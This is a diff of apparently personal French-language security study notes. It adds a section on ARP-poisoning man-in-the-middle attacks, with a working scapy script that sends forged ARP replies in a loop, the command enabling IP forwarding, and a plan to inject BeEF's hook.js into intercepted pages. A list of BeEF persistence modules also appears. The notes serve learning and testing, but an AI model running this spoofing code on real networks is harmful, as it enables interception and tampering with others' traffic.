@@ -531,6 +531,7 @@ quand l'ordi 1 recoit la reponse, il peut mettre a jour son cache ARP aussi
 ==> faire installer une extension de navigateur malveillante
 
 |Persistance module|github beef|mes tests|
+|----|----|----|
 |confirm_close_tab | still worked last i checked; but not as effective as it used to be. | pas dans chrome, marche dans safari mais nul, pirncipe que ca demande encore et encore si on veut fermer l'onglet|
 |hijack_opener |works, but requires specific conditions |fonctionne pas dans chrome|
 |invisible_htmlfile_activex|nice bug, but only ever worked in IE11. now patched.||
@@ -556,16 +557,78 @@ automatic rule angine in beef to run automaticly modules [automatic rules](https
 
 # III - MiTM ARP Poisoning
 
+Mitm ARP Poisining ==> un peu dépassé, mais pas grave
 
+Il est impossible de communiquer avec une machine dans un sous-réseau que avec son adresse IP. Il faut absolument avoir son adresse MAC (adresse fixe sur chaque périphérique). ARP (adress resolution protocole) = protocole qui permet d'identifier les périphériques sur un réseau, en traduisant les adresse IP en adresse MAC. Protocole qui possède une faille de sécurité. 
 
+- Conditions : attaque sur un LAN utilisant le protocole de résolution d'adresse ARP (Exemple : réseaux Ethernet et Wi-Fi)
+- Principe : l'attaquant détourne les flux de communications transitant entre une machine cible et une passerelle : routeur, box, etc
+- Exploitation : possibilité d'écouter, modifier ou encore bloquer les paquets réseaux qui transitent
 
+```
+// imaginons ce réseau local :
+192.168.1.1 : passerelle.
+192.168.1.10 : machine cible.
+192.168.1.17 : attaquant.
 
+// l'attaquant forge un paquet ARP où il dit à la machine de la victime que son adresse MAC correspond à l'IP de la passerelle
+Paquet ARP :
+ip_source= 192.168.1.1
+mac_source= <adresse_mac attaquant>
+ip_destination= 192.168.1.10
+```
+```
+arp -a // commande qui permet de voir la table arp
+// Table ARP : tableau de correspondance entre une adresse IP et une adresse MAC
+// Si un périphérique 1 veut parler à un périphérique 2 mais n'a pas son addr MAC, va demander et c'est le periphérique concerné qui est censé faire une réponse ARP avec son addr MAC. Avec la réponse périphérique 1 rempli sa table ARP, et la prochaine fois n'aura pas a demandé l'addr MAC.
+```
 
+## 1. ARP Poisoning
 
+#### a. Réussir à mettre notre adresse MAC à la place de l'adresse MAC du routeur dans la table ARP de la machine cible
 
+Pour exploiter cette faille différents outils ;
+- arpspoof
+- ettercap
+- arpoison
+- Ou possible de la faire à la main en python avec la librairie scapy
 
+````
+from scapy.all import *
 
+trame = Ether(type=0x0806) # créer une trame ethernet, valeur type permet de dire quel protocole on utilise, le ARP = 0x0806
+packet = ARP # retourne un paquet arp vide, dans elquel on va remplire les infos
 
+packet.hwlen = 6
+packet.plen = 4
+packet.op = 2
+packet.psrc = 'xxx ip'
+packet.pdst = 'xxx ip'
+packet.hwsrc = 'xxx mac'
+packet.hwdst = 'xxx mac'
+
+total = trame / packet
+while True: #envoyer le packet
+       sendp(total) 
+````
+
+Résultat : on reçoit bien tous les paquets qui sont déstinés au routeur, la machine cible croit qu'on est le routeur
+
+#### b. Router les paquets reçus de la machine cible vers le routeur
+
+Par défaut, si une machine linux reçoit des paquets qui ne lui sont pas destinés (avec une IP différente), elle jete les paquets = IP forwarding est désactivé par défaut.
+```
+echo 1 > /proc/sys/net/ipv4/ip_forward #activer le forwarding des paquets
+```
+
+#### c. Faire le même choses pour les paquets qui vont du routeur à la cible
+
+- Réussir à mettre notre adresse MAC à la place de l'adresse MAC de la victime dans la table ARP du routeur
+- Router les paquets vers la victime
+
+## 2. Monitoring & modify the traffic
+
+-> ajouter le hook.js dans toutes les pages http
 
 
 -------------
